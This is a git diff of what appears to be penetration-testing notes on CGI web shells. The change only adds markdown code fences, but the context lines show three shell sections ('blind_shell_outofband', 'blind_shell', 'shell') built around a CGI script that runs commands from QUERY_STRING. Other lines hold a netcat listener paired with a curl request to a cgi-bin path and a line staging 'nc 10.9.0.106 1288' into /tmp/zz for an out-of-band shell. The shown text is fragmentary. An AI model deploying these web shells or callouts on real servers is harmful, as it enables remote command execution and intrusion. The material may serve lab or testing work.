@@ -23,7 +23,7 @@ echo -ne '\n\n' | nc -q 2 -C -lp 8000 & curl 'http://192.168.102.5:8080/cgi-bin/
 
 
 blind_shell_outofband
-
+```
 #!/bin/sh
 echo "Content-type: text/html"
 echo ""
@@ -36,10 +36,10 @@ cmd=$QUERY_STRING
 echo "</pre></body></html>"
 echo ""
 echo ""
-
+```
 
 blind_shell
-
+```
 #!/bin/sh
 echo "Content-type: text/html"
 echo ""
@@ -52,10 +52,10 @@ cmd=$QUERY_STRING
 echo "</pre></body></html>"
 echo ""
 echo ""
-
+```
 
 shell
-
+```
 #!/bin/sh
 echo "Content-type: text/html"
 echo ""
@@ -68,7 +68,7 @@ cmd=$QUERY_STRING
 echo "</pre></body></html>"
 echo ""
 echo ""
-
+```
 
 
 echo "nc 10.9.0.106 1288" > /tmp/zz
